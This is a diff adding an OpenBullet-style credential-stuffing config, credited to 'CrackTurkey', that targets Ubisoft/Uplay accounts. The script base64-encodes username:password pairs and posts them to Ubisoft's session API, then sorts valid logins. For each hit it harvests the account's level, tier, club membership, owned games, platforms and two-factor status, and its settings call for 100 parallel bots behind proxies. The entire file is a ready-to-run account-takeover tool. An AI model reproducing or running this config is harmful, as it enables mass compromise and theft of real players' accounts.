@@ -1,0 +1,126 @@
+[SETTINGS]
+{
+  "Name": "Uplay NEW",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-05T14:23:17.8715696+03:00",
+  "AdditionalInfo": "",
+  "Author": " e a m",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Sağlam Proxy Gerektirir",
+      "VariableName": "",
+      "Id": 1932063527
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#CrackTurkey FUNCTION Base64Encode "<USER>:<PASS>" -> VAR "1" 
+
+#CrackTurkey REQUEST POST "https://public-ubiservices.ubi.com/v3/profiles/sessions" 
+  CONTENT "{\"rememberMe\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Basic <1>" 
+  HEADER "GenomeId: 4f9d4adf-3646-4058-8553-c7b48df556e0" 
+  HEADER "Ubi-AppId: 39baebad-39e5-4552-8c25-2c9b919064e2" 
+  HEADER "Ubi-RequestedPlatformType: uplay" 
+
+#CrackTurkey KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"ticket\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "ticket\":\"" "\",\"" -> VAR "2" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "userId\":\"" "\",\"" -> VAR "3" 
+
+#CrackTurkey REQUEST GET "https://public-ubiservices.ubi.com/v1/profiles/club?profileIds=<3>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authorization: Ubi_v1 t=<2>" 
+  HEADER "GenomeId: 4f9d4adf-3646-4058-8553-c7b48df556e0" 
+  HEADER "Ubi-AppId: 39baebad-39e5-4552-8c25-2c9b919064e2" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "units\":" ",\"" -> CAP "Units" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "levelNumber\":" ",\"" -> CAP "Level" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "tierName\":\"" "\",\"" -> CAP "Tier" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "isClubMember\":" ",\"" -> CAP "Kulüp Üyeliği" 
+
+#CrackTurkey REQUEST GET "https://wspuplay-ext.ubi.com/UplayServices/WinServices/GameClientServices.svc/REST/JSON/GetGamePlatformsByUserId/<3>/en-US/?onlyOwned=true&rowsCount=-1&pCodeIssuer=PC&country=EN" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authorization: Ubi_v1 t=<2>" 
+  HEADER "GenomeId: 4f9d4adf-3646-4058-8553-c7b48df556e0" 
+  HEADER "Ubi-AppId: 39baebad-39e5-4552-8c25-2c9b919064e2" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "\"Name\":\"" "\"" Recursive=TRUE -> CAP "Oyunlar" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "PlatformCode\":\"" "\",\"" Recursive=TRUE -> CAP "Platformlar" 
+
+#CrackTurkey REQUEST GET "https://public-ubiservices.ubi.com/v2/profiles/me/2fa" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authorization: Ubi_v1 t=<2>" 
+  HEADER "GenomeId: 4f9d4adf-3646-4058-8553-c7b48df556e0" 
+  HEADER "Ubi-AppId: 39baebad-39e5-4552-8c25-2c9b919064e2" 
+
+#CrackTurkey KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "active\":true" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "active\":" ",\"" -> CAP "2FA" 
+
